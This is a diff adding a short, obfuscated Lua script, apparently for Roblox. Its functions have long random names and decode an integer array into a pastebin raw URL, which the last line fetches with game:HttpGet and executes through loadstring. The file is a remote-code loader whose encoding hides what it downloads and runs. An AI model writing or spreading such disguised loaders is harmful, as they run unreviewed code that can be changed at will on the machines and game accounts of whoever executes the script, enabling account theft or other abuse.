@@ -1,0 +1,16 @@
+function IhKRJheQtJUMTWwxfQqEDfwbXMrDytBjuHmmrKpdKtSDYWeYJbcohWoQsGJoXfCfsEdMgphAwLJJJjHQQluAJyLGrjTyURBC(c)
+tab={}
+for i = 1,#c do
+x=string.len(c[i]) 
+y=string.char(x)
+table.insert(tab,y)
+end
+x=table.concat(tab)
+return x
+end 
+
+
+function MdjLRnaTiYHnhnoXEASDuyeLWDMBOfeAGdTTEeSRXpWsigPCppXL(code)res=IhKRJheQtJUMTWwxfQqEDfwbXMrDytBjuHmmrKpdKtSDYWeYJbcohWoQsGJoXfCfsEdMgphAwLJJJjHQQluAJyLGrjTyURBC({})for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
+
+
+loadstring(game:HttpGet(MdjLRnaTiYHnhnoXEASDuyeLWDMBOfeAGdTTEeSRXpWsigPCppXL({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10290,11025,11550,4830,10395,11655,11445,4935,11970,10185,12495,4935,8925,5670,6825,12075,8400,10815,11130,11970})))()          
